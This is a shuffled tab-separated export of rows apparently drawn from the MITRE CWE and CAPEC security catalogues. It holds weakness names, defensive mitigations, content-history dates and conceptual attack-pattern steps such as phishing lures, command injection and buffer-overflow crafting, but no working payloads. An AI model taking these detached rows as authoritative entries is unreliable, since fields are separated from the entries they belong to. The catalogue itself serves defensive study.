13070	95	[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.
17636	35	Cigital
13936	81	Confidentiality
16832	35	MITRE
6228	28	CWE Content Team
17760	62	updated Common_Consequences
13388	31	699
8824	28	CWE Content Team
18796	47	Execute Unauthorized Commands
23265	62	updated Demonstrative_Examples, Description, Related_Attack_Patterns
9292	55	CAPEC Content Team
11714	35	MITRE
21735	78	High
18197	35	MITRE
7274	28	Eric Dalci
7242	100	The MITRE Corporation
24253	28	CWE Content Team
23571	35	MITRE
7161	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
6045	74	4
12372	103	Primary
25373	56	ChildOf
17318	33	Dongseok Jang
15513	79	Availability
16349	59	Updated Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, Related_Attack_Patterns, Skills_Required, Typical_Severity
20532	39	2011-06-01
8383	35	MITRE
22557	91	Architecture and Design
11946	102	ChildOf
14260	46	This weakness focuses on errors in which the program should not release a resource, but performs the release anyway. This is different than a weakness in which the program releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weaknesses, the resource should still be valid upon the subsequent access.             When a program releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.
9905	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
25369	104	862
16200	95	[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application
21923	62	updated Common_Consequences
6405	23	An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.
15104	45	Class
9445	62	updated Common_Consequences
20178	72	Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access.
21923	39	2011-06-01
25334	104	1090
8340	50	Monitor API calls like ptrace system call, use of LD_PRELOAD environment variable, dlfcn dynamic linking API calls, and similar for Linux.
20360	80	An attacker may craft subtle encoding of input data by using the knowledge that she has gathered about the target host.
19021	88	Comparing instead of Assigning
6419	78	High
9564	62	updated Relationships
9432	62	updated Relationships, Taxonomy_Mappings
13163	39	2010-06-21
18758	47	Read Data
5688	79	Availability
16187	39	2019-06-20
22481	28	CWE Content Team
15117	62	added/updated demonstrative examples
24871	56	CanPrecede
12947	36	http://mirror.transact.net.au/sourceforge/w/project/wa/waspap/waspap/Core/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf
22970	35	MITRE
19788	62	updated Likelihood_of_Exploit, References
23249	69	Draft
11846	91	Testing
10297	24	MITRE
17258	23	An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.
6985	28	CWE Content Team
19884	81	Integrity
8083	78	High
15062	101	CAPEC Content Team
21488	77	Automated Static Analysis
11723	28	CWE Content Team
20072	56	PeerOf
6103	56	ChildOf
11479	88	Information Exposure Through Timing Discrepancy
5593	35	MITRE
11731	63	Modify Files or Directories
7175	35	Cigital
15188	73	Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.
24165	35	MITRE
16606	62	updated Common_Consequences, Description, Other_Notes, Potential_Mitigations
12193	35	MITRE
11327	28	CWE Content Team
10985	39	2010-06-21
8079	35	MITRE
10228	90	Language-Independent
24124	104	479
10603	23	Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.
12982	28	CWE Content Team
10253	72	This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.
11718	43	Simple
17679	35	MITRE
20532	35	MITRE
11320	59	Updated Example_Instances, Taxonomy_Mappings
23580	79	Access Control
11048	35	MITRE
18072	72	An attacker could perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account.
16313	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7638	81	Confidentiality
6849	31	1003
6817	79	Confidentiality
6250	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
17518	62	updated Relationships
12187	78	Low
10508	88	Information Exposure Through Query Strings in GET Request
10407	56	ChildOf
10154	31	1000
23293	103	Primary
9768	81	Integrity
15522	35	Cigital
11333	62	updated Relationships
20588	69	Incomplete
8532	39	2008-07-01
9661	35	MITRE
15868	21	PLOVER
13312	90	Perl
10402	62	updated Demonstrative_Examples
12120	78	Very High
21027	35	MITRE
10821	76	2018-07-31
16266	39	2012-05-11
13878	35	MITRE
16178	103	Primary
14070	88	Improper Verification of Source of a Communication Channel
20009	81	Availability
8264	25	Low
10308	23	The software does not handle or incorrectly handles inputs that are related to complex structures.
6174	61	Draft
8769	39	2011-03-29
10106	35	MITRE
11715	103	Primary
9426	35	MITRE
17077	69	Incomplete
25083	44	High
22910	28	CWE Content Team
24791	103	Primary
8495	39	2008-07-01
23659	62	updated Applicable_Platforms
21772	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
23406	57	Indirect
22077	88	Path Traversal: '..\filedir'
6767	56	ChildOf
11434	28	CWE Content Team
21524	26	Implementation
21117	35	MITRE
23421	62	updated Common_Consequences
9797	91	Build and Compilation
14044	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22433	26	Implementation
23778	50	Implementation: DNS-hold-open
24329	35	MITRE
6646	60	04
23942	28	CWE Content Team
6936	89	Detailed
7206	80	Being able to "run the race" requires basic knowledge of concurrent processing including synchonization techniques.
12502	35	Cigital
9660	80	This attack pattern often requires the technical ability to modify a malicious software package (e.g. Zeus) to spider a targeted site and a way to trick a user into a malicious software download.
11281	62	Suggested OWASP Top Ten 2004 mapping
12317	40	None
18014	39	2008-09-08
25283	35	MITRE
13670	28	CWE Content Team
25137	63	Unexpected State
22460	51	2014-06-23
10427	39	2010-06-21
13658	44	SOAR Partial
24576	79	Authorization
10025	45	Variant
12657	30	Stefano Di Paola
12148	50	Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.
11880	69	Incomplete
9561	92	Explore
18091	28	Eric Dalci
22482	21	CWE Content Team
12158	28	CWE Content Team
13291	35	MITRE
17284	28	CWE Content Team
15913	63	Other
20188	103	Primary
20517	66	Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!
12053	39	2011-06-01
21806	102	ChildOf
21812	87	Web Server
6742	76	2019-04-04
10334	104	26
11159	21	PLOVER
6691	23	A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.
12346	28	CWE Content Team
22460	55	CAPEC Content Team
18255	91	Architecture and Design
23050	100	The MITRE Corporation
19190	35	MITRE
21540	97	Reflected XSS
18867	39	2012-05-11
17182	79	Confidentiality
6190	35	MITRE
8332	35	MITRE
15775	57	Resultant
22431	81	Confidentiality
21112	102	ChildOf
11432	62	updated Common_Consequences, Relationships
22134	28	CWE Content Team
22089	63	Read Files or Directories
13630	35	MITRE
13714	35	MITRE
21629	35	MITRE
20371	62	updated Demonstrative_Examples, Observed_Examples
11893	28	CWE Content Team
17252	28	CWE Content Team
17631	81	Availability
8134	28	CWE Content Team
18941	35	MITRE
16021	40	An application that leverages a client-side web browser with scripting enabled.
13293	104	197
6914	35	MITRE
18262	39	2017-11-08
13172	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9169	62	updated Common_Consequences, References, Relationships
20088	39	2011-03-29
13123	71	2009
9547	81	Accountability
9730	74	3
18922	43	Simple
15042	23	This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.
7772	63	Varies by Context
21557	85	619
19618	25	High
7149	81	Confidentiality
6060	62	updated Time_of_Introduction
6916	78	Medium
19461	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
17735	43	Simple
25194	81	Confidentiality
17764	28	CWE Content Team
12579	35	MITRE
9490	39	2008-07-01
15630	35	MITRE
16478	79	Confidentiality
15129	35	MITRE
11576	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer                                                                     Cost effective for partial coverage:                                                                           Warning Flags                            Source Code Quality Analyzer
6784	77	Automated Static Analysis - Binary or Bytecode
24145	46	If the drop fails, the software will continue to run with the raised privileges, which might provide additional access to unprivileged users.
21253	89	Detailed
24064	92	Experiment
24457	88	Exposed Unsafe ActiveX Method
17329	57	Primary
7151	91	Architecture and Design
10425	91	Requirements
9821	33	Deral Heiland
21504	62	updated References
16797	88	Inefficient CPU Computation
18094	31	1000
23162	69	Incomplete
14242	81	Other
10983	35	MITRE
11795	33	Michael Schwarz
21789	39	2014-07-30
10289	28	CWE Content Team
16778	60	03
17125	45	Base
23336	35	MITRE
11048	39	2012-10-30
7811	78	Medium
19556	28	CWE Content Team
9644	42	Use other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.
20228	53	The MITRE Corporation
14226	62	Suggested OWASP Top Ten 2004 mapping
15488	31	1003
23045	39	2009-05-27
20400	30	J. Rasley
16135	79	Confidentiality
16927	63	Reduce Reliability
17504	62	updated Potential_Mitigations
18874	39	2014-07-30
7833	102	ChildOf
5629	69	Draft
6135	102	ChildOf
8122	26	Architecture and Design
12551	58	Soft links are a UNIX term that is synonymous with simple shortcuts on windows based platforms.
9571	58	The Apple HFS+ file system permits files to have multiple data input streams, accessible through special paths. The Mac OS X operating system provides a way to access the different data input streams through special paths and as an extended attribute:                                   - Resource fork: file/..namedfork/rsrc, file/rsrc (deprecated), xattr:com.apple.ResourceFork                   - Data fork: file/..namedfork/data (only versions prior to Mac OS X v10.5)                                Additionally, on filesystems that lack native support for multiple streams, the resource fork and file metadata may be stored in a file with "._" prepended to the name.                Forks can also be accessed through non-portable APIs.                Forks inherit the file system access controls of the file they belong to.                Programs need to control access to these paths, if the processing of a file system object is dependent on the structure of its path.
11844	25	Medium
14808	35	MITRE
20872	35	MITRE
7298	51	2014-06-23
16105	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
8140	56	ChildOf
18914	31	1000
20177	97	Buffer Overflow via Environment Variables
20280	42	Perform proper forward and reverse DNS lookups to detect DNS spoofing.
14333	101	CAPEC Content Team
16380	35	MITRE
20249	90	Language-Independent
11522	63	Alter Execution Logic
8100	62	updated Relationships
13673	43	Simple
12928	69	Draft
10204	94	Attacks that successfully influence the target into performing an action via psychological principles can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
20205	35	MITRE
20693	90	PHP
13568	77	Architecture or Design Review
24174	39	2017-11-08
17328	63	Gain Privileges or Assume Identity
20533	81	Confidentiality
22570	28	CWE Content Team
19200	39	2012-05-11
8136	92	Explore
15109	39	2019-06-20
13974	28	CWE Content Team
9267	56	ChildOf
19171	35	MITRE
14483	39	2014-07-30
12757	85	423
5975	81	Non-Repudiation
25278	88	Time-of-check Time-of-use (TOCTOU) Race Condition
24266	28	CWE Content Team
5866	28	CWE Content Team
24619	51	2014-06-23
11330	39	2009-03-10
12140	62	updated Relationships, Taxonomy_Mappings
9361	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
23019	39	2012-10-30
9654	40	The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.
12613	35	MITRE
22377	35	MITRE
17914	62	updated References, Relationships, Taxonomy_Mappings
25197	55	CAPEC Content Team
20809	79	Integrity
11343	55	CAPEC Content Team
22511	42	Avoid any external control of variables. If necessary, restrict the variables that can be modified using a whitelist, and use a different namespace or naming convention if possible.
23789	39	2014-07-30
13196	26	Implementation
11631	31	1000
21128	62	updated Common_Consequences
22444	39	2010-06-21
14078	91	System Configuration
7857	95	Observe the effects. See if the probes are getting past the filters. Identify a string that is semantically equivalent to that which an adversary wants to pass to the targeted API, but syntactically structured in a way as to get past the input filter. That encoding will contain certain ghost characters that will help it get past the filters. These ghost characters will be ignored by the targeted API.
11448	51	2014-06-23
22738	39	2011-06-01
7311	31	1000
15901	76	2017-05-01
13741	62	updated Relationships, Taxonomy_Mappings
8013	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
16171	62	updated Description
12759	35	MITRE
12978	85	27
21446	31	1000
19891	45	Base
24258	28	CWE Content Team
14471	33	Daniel Kulp
18822	28	CWE Content Team
18199	39	2011-06-01
7200	62	updated Relationships
23346	81	Confidentiality
22289	23	An attacker searches a targeted web site for web services that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging services, or otherwise predictable services within the site tree. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.
25438	51	2014-06-23
23511	101	CAPEC Content Team
9640	69	Draft
13552	62	updated Potential_Mitigations
18547	81	Confidentiality
17115	39	2017-05-03
15048	35	Cigital
9853	28	CWE Content Team
16972	35	MITRE
13445	23	A UI function is obsolete and the product does not warn the user.
23367	59	Updated Attack_Phases
7747	35	MITRE
9100	77	Manual Analysis
6794	28	CWE Content Team
6898	35	MITRE
15558	59	Updated Related_Attack_Patterns, Related_Weaknesses
6462	35	MITRE
22027	42	Follow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data.
5699	76	2018-07-31
24375	61	Draft
11163	39	2014-07-30
8401	88	Reliance on Security Through Obscurity
11820	62	updated Potential_Mitigations, References
14603	104	588
11664	81	Confidentiality
12593	91	Requirements
10310	62	updated Relationships, Taxonomy_Mappings
24521	91	Implementation
9578	35	Cigital
12436	103	Primary
6269	28	CWE Content Team
18291	61	Stable
15269	92	Experiment
17321	54	High
9699	49	2002
11614	63	Read Application Data
9573	62	updated Applicable_Platforms, Causal_Nature, Common_Consequences, Demonstrative_Examples, Description, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Weakness_Ordinalities
19356	47	Modify Data
16772	62	updated Demonstrative_Examples, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations
21460	97	Altered Installed BIOS
11996	90	Language-Independent
9365	81	Integrity
7445	104	64
22660	46	A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol.
23593	28	CWE Content Team
11627	39	2014-07-30
21947	31	699
13299	35	MITRE
14952	56	ChildOf
19430	35	MITRE
18630	73	Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server
16729	102	ChildOf
10460	28	CWE Content Team
5867	28	CWE Content Team
11398	80	To overwrite session cookie data, and submit targeted attacks via HTTP
17147	23	Opening temporary files without appropriate measures or controls can leave the file, its contents and any function that it impacts vulnerable to attack.
18626	39	2008-09-08
18175	28	CWE Content Team
17872	63	DoS: Resource Consumption (Memory)
12311	69	Incomplete
18599	63	Unexpected State
24550	62	updated Common_Consequences, References, Relationships
13938	39	2014-07-30
19436	62	updated Relationships
20017	35	MITRE
24946	21	PLOVER
17976	56	ChildOf
22856	76	2019-09-30
19376	62	updated Demonstrative_Examples, Name
23902	66	The Oracle Hacker's Handbook
24455	35	MITRE
10805	69	Draft
11352	35	MITRE
11891	103	Primary
24788	35	MITRE
17593	28	CWE Content Team
18572	28	CWE Content Team
17539	28	CWE Content Team
16031	31	1000
18485	39	2017-11-08
13506	42	Always verify and authenticate the source of the message.
7375	62	updated Time_of_Introduction
7547	81	Integrity
16701	44	SOAR Partial
10160	81	Other
8135	28	CWE Content Team
20135	39	2012-05-11
7544	77	Architecture or Design Review
14935	83	OWASP EU09 Poland
7996	28	CWE Content Team
22149	31	1000
10887	35	MITRE
7274	62	updated Time_of_Introduction
11795	33	Stefan Mangard
5669	103	Primary
21975	62	updated Relationships, Taxonomy_Mappings
18339	23	The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.
15244	39	2012-10-30
22281	100	The MITRE Corporation
23264	62	Suggested OWASP Top Ten 2004 mapping
22731	28	CWE Content Team
9690	28	CWE Content Team
21023	62	updated Common_Consequences
21777	39	2014-07-30
22085	62	Improved the White_Box_Definition
13782	91	Implementation
14435	26	Implementation
8151	35	MITRE
15838	39	2017-01-19
25002	62	updated Common_Consequences
14036	42	When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.
8031	63	Bypass Protection Mechanism
12387	39	2009-05-27
17440	23	Security tools often inspect executables to determine if they are malicious. Adversaries may add data to executables to increase the executable size beyond what security tools are capable of handling. Adding data to an executable also changes the file's hash, frustrating security tools that look for known bad files by their hash.
6067	39	2009-12-28
11040	79	Confidentiality
23447	42	Support a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the software. This may result in a denial-of-service to legitimate software users, but it will prevent the software from adversely impacting the entire system.
7052	31	699
8205	39	2008-09-08
8996	39	2017-11-08
5827	62	updated Related_Attack_Patterns
20077	28	Eric Dalci
7133	48	01
22228	39	2014-06-23
19251	76	2015-11-09
23028	35	MITRE
25253	63	Read Files or Directories
22744	97	Password Recovery Exploitation
9284	39	2012-10-30
24154	39	2012-05-11
8033	28	CWE Content Team
11799	81	Other
6341	81	Availability
13905	103	Primary
18387	28	CWE Content Team
5843	90	Java
11073	39	2010-06-21
6561	39	2014-07-30
9059	45	Base
18851	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                                                                     Cost effective for partial coverage:                                                                           Formal Methods / Correct-By-Construction
8720	102	CanPrecede
12373	81	Access Control
23817	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as input terminators when they are sent to a downstream component.
18154	28	CWE Content Team
20036	103	Primary
10012	90	Compiled
12324	56	ChildOf
8922	39	2015-12-07
12114	95	The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.
21024	39	2010-04-05
21222	31	699
17810	62	updated Related_Attack_Patterns
10111	89	Standard
5983	39	2008-07-01
20350	63	DoS: Crash, Exit, or Restart
24819	35	MITRE
8238	33	Chris Anley
22342	31	1000
23177	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
8931	56	ChildOf
21562	66	Never Assuming that Your Secrets Are Safe
18429	88	Protection Mechanism Failure
21950	80	Open source and commercial software tools are available and several commercial advertising companies routinely set up tools to collect and monitor MAC addresses.
6284	78	High
16713	53	The MITRE Corporation
7465	101	CAPEC Content Team
13472	21	CWE Content Team
6609	88	Unprotected Primary Channel
17896	35	MITRE
25321	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria                            Web Application Scanner                            Web Services Scanner                            Database Scanners
8819	69	Draft
9659	28	CWE Content Team
10273	40	The reset functionality must be inadequately protected against use.
8192	101	CAPEC Content Team
16877	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
10526	72	If the released resource is subsequently reused or reallocated, then a read operation on the original resource might access sensitive data that is associated with a different user or entity.
14263	81	Integrity
23044	40	The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.
13714	28	CWE Content Team
8843	35	MITRE
16151	85	36
14099	62	updated Potential_Mitigations, Relationships
11193	104	1061
17709	81	Integrity
16460	76	2019-04-04
7659	39	2011-06-27
21253	85	221
21195	42	Utilize an appropriate mix of whitelist and blacklist parsing to filter control-plane syntax from all input.
18785	28	CWE Content Team
14063	31	1000
21807	32	Lookout Mobile Security
12617	70	RFC1122 - Requirements for Internet Hosts - Communication Layers
17190	94	Tracking, Network Reconnaissance
13132	42	Use OS-level preventative functionality. This is not a complete solution, but it provides some defense in depth.
6780	35	MITRE
22559	62	updated Demonstrative_Examples, Relationships
10325	62	updated Relationships
13353	39	2017-05-03
21362	28	CWE Content Team
17924	28	CWE Content Team
16215	53	The MITRE Corporation
9195	28	CWE Content Team
6704	76	2018-07-31
6323	36	http://www.owasp.org/index.php/Testing_for_Cross_site_flashing_(OWASP-DV-004)
21693	76	2015-11-09
9254	31	1000
6065	92	Experiment
20222	104	1056
17114	40	Physical access to the system or the integration facility where hardware components are kept.
18589	25	Low
16834	28	Eric Dalci
21551	67	Medium
24570	62	updated Common_Consequences
8695	39	2012-05-11
8997	61	Draft
8457	69	Draft
17579	69	Incomplete
14745	43	Simple
16057	50	Use proven cryptographic algorithms with recommended key sizes.
20871	93	Moderate
9193	76	2015-11-09
15328	66	Intrinsic Locks and Synchronization (in Java)
18321	56	ChildOf
12985	35	MITRE
24450	89	Meta
23115	103	Primary
21721	39	2011-03-29
14250	76	2018-07-31
6571	39	2008-09-08
14010	100	The MITRE Corporation
6974	56	CanPrecede
6373	63	Modify Application Data
16783	39	2008-08-15
24602	88	Improper Restriction of Power Consumption
14698	39	2010-02-16
12670	90	Java
22988	81	Confidentiality
15606	62	updated Common_Consequences
10175	31	699
15422	35	Cigital
8159	61	Stable
12296	78	Low
10170	94	Run Arbitrary Code
24618	62	updated Relationships
23393	97	AJAX Fingerprinting
22843	103	Primary
15693	62	updated Relationships, Taxonomy_Mappings
11130	35	MITRE
19628	31	1000
23811	69	Incomplete
9317	91	Implementation
21991	73	Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)
20341	62	updated Relationships, Other_Notes, Taxonomy_Mappings
18473	62	updated Description
24218	71	2006
12506	70	SAMATE - Software Assurance Metrics And Tool Evaluation
5927	30	Jacob Appelbaum
13873	72	The data read may not be properly secured, it might be viewed by an attacker.
13799	62	updated Potential_Mitigations
15444	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
13836	39	2011-06-01
24549	39	2008-11-24
10644	81	Integrity
10556	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
24978	62	updated Observed_Examples
5860	28	CWE Content Team
6656	48	03
6794	35	MITRE
16029	96	2010-09-22
13400	100	The MITRE Corporation
10020	101	CAPEC Content Team
16612	62	updated Common_Consequences
23161	28	CWE Content Team
12076	91	Architecture and Design
7937	62	updated Potential_Mitigations
23305	31	699
19850	28	CWE Content Team
23382	62	updated Applicable_Platforms, Description, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Theoretical_Notes
22115	81	Integrity
16618	35	MITRE
24879	61	Draft
17532	59	Updated Attack_Phases
15847	39	2012-05-11
16113	62	updated Common_Consequences
23906	90	Language-Independent
24944	81	Confidentiality
23701	28	CWE Content Team
24286	24	MITRE
20412	23	An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.
6030	90	Language-Independent
7861	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize "../" sequences that can resolve to a location that is outside of that directory.
8506	62	updated Relationships
11649	56	ChildOf
9551	81	Access Control
18385	103	Primary
8152	91	Implementation
11140	62	updated Relationships
14643	61	Draft
17753	62	updated Related_Attack_Patterns
17740	95	The target host acts on the data and unexpected behavior may happen.
18890	62	updated Time_of_Introduction
14355	62	updated Description, Other_Notes, Potential_Mitigations
11086	30	Jakob Kallin
6322	90	Java
10417	39	2014-07-30
6388	62	updated Detection_Factors, Potential_Mitigations
24187	103	Primary
18730	40	The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.
24923	49	2007
11588	36	http://scary.beasts.org/security/CESA-2007-002.html
14067	31	1000
13528	62	updated Potential_Mitigations
16564	21	CWE Content Team
23773	94	Action spoofing can result in a wide variety of consequences and negatively affect all three elements of the security triad.
16398	69	Draft
11034	63	Read Memory
19784	97	Tapjacking
12059	39	2008-07-01
12963	90	ASP.NET
15236	103	Primary
24970	30	Adi Sharabani
15520	56	ChildOf
9507	56	ChildOf
12402	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
21609	62	updated Relationships
13964	47	Read Data
13943	21	PLOVER
14449	62	Suggested OWASP Top Ten 2004 mapping
17322	39	2008-07-01
17356	23	The software does not neutralize or incorrectly neutralizes "javascript:" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.
20909	62	updated References, Taxonomy_Mappings
25216	39	2008-07-01
20356	28	CWE Content Team
18003	32	Wiley
7452	51	2014-06-23
19994	28	CWE Content Team
13614	28	CWE Content Team
13105	39	2012-10-30
22553	97	Reflection Injection
25043	28	CWE Content Team
6727	28	CWE Content Team
11662	90	Language-Independent
17577	35	MITRE
7693	39	2011-03-29
23594	35	MITRE
7614	61	Draft
9219	81	Other
18302	33	Nicholas Carlini
7825	89	Detailed
24445	95	[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.
22730	35	MITRE
11289	57	Primary
5633	39	2011-06-01
7547	81	Access Control
14176	55	CAPEC Content Team
7360	62	Suggested OWASP Top Ten 2004 mapping
18974	72	Misplaced null characters may result in any number of security problems. The biggest issue is a subset of buffer overflow, and write-what-where conditions, where data corruption occurs from the writing of a null character over valid data, or even instructions. A randomly placed null character may put the system into an undefined state, and therefore make it prone to crashing. A misplaced null character may corrupt other data in memory.
15406	62	updated Demonstrative_Examples, Name
15922	35	MITRE
13093	103	Primary
17157	72	An empty synchronized block will wait until nobody else is using the synchronizer being specified. While this may be part of the desired behavior, because you haven't protected the subsequent code by placing it inside the synchronized block, nothing is stopping somebody else from modifying whatever it was you were waiting for while you run the subsequent code.
15508	76	2017-08-04
8441	26	Architecture and Design
5898	28	Eric Dalci
9429	28	CWE Content Team
14495	35	Cigital
11769	35	MITRE
18698	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
22951	101	CAPEC Content Team
12669	39	2019-01-03
17696	102	ChildOf
5717	46	Use of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues. This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
7055	63	Execute Unauthorized Code or Commands
21469	39	2009-05-27
13511	35	MITRE
11437	35	MITRE
7288	35	MITRE
19901	80	To inject the malicious payload in a web page
17373	39	2011-03-29
5700	39	2011-06-01
20274	28	CWE Content Team
12927	35	MITRE
7341	80	Crafting the proper malicious site and luring the victim to this site are not trivial tasks.
9980	53	The MITRE Corporation
7050	77	Automated Static Analysis - Source Code
24796	56	ChildOf
24890	31	1000
22592	56	CanPrecede
24735	104	909
24515	39	2012-05-11
14750	42	Remove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application.
12132	35	MITRE
16394	62	updated Affected_Resources, Applicable_Platforms, Modes_of_Introduction, Relationships
19078	88	Incorrect Authorization
